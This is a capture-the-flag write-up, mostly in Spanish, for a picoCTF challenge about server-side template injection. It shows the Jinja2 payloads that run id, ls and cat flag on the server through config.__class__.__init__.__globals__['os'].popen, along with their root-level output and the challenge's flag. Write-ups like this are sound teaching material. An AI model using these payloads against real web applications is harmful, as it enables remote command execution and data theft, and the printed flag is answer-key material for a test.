## Descripción 
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!
## Solución
- vemos que todo lo que escribimos se muestra en pantalla en un h1
- si usamos {{operacion}} las dobles llaves, cualquier cosa que este adentro lo toma como una operacion
```
{{6*6}} ----> 36
```
- vemos que esta es un tipo de plantilla tipo SSTI(server side template injection)
- tiene un vulnerabilidad d que es cuando tu servidor interpreta una entrada  como plantilla, esto puede agarrar codigo local y ejecutarlo en el servidor

- probamos si tiene esa vulenarabilidad
```
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

y regresa 

uid=0(root) gid=0(root) groups=0(root) 
```

- si modificamos un poco la sentancia
  ```
  {{ config.__class__.__init__.__globals__['os'].popen("ls").read() }}
  
  regresa un listado de lo que hay 
  __pycache__ app.py flag requirements.txt 
  ```

- y finalmente abrimos la flag
  ```
  {{ config.__class__.__init__.__globals__['os'].popen("cat flag").read() }}
  
  regresa 
  picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
  ```
## Referencias
- https://rinku.tech/ssti/